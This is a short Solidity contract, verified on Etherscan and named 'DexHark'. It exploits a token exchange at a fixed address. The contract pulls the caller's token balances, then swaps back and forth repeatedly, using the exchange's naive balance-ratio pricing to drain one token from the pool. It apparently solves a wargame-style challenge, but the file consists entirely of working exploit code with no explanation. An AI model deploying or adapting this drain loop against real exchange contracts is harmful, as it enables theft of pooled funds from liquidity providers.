/**
 *Submitted for verification at Etherscan.io on 2022-11-19
*/

pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint amout) external;
    function transferFrom(address from, address to, uint amout) external;
    function balanceOf(address addr) external returns(uint);
    function allowance(address owner, address spender) external view returns (uint);
}

interface IDex {
    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint value) external;
}

contract DexHark {
    address constant DEX = address(0x0A86915457afeD2114eE7d7Cc761f0620bc6a834);

    function approve() public {
        IDex(DEX).approve(DEX, type(uint).max);
    }

    function doIt() public {
        IDex dex = IDex(DEX);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());
        
        // prepare
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));

        // start
        approve();
        while (true) {
            uint meT1 = token1.balanceOf(address(this));
            uint dexT1 = token1.balanceOf(DEX);
            uint dexT2 = token2.balanceOf(DEX);

            if (dexT1 == 0 || dexT2 == 0) {
                break;
            }

            uint next = (meT1 * dexT2) / dexT1;
            uint amount = next <= dexT2 ? meT1 : dexT1;

            dex.swap(address(token1), address(token2), amount);
            (token1, token2) = (token2, token1);
        }
    }
}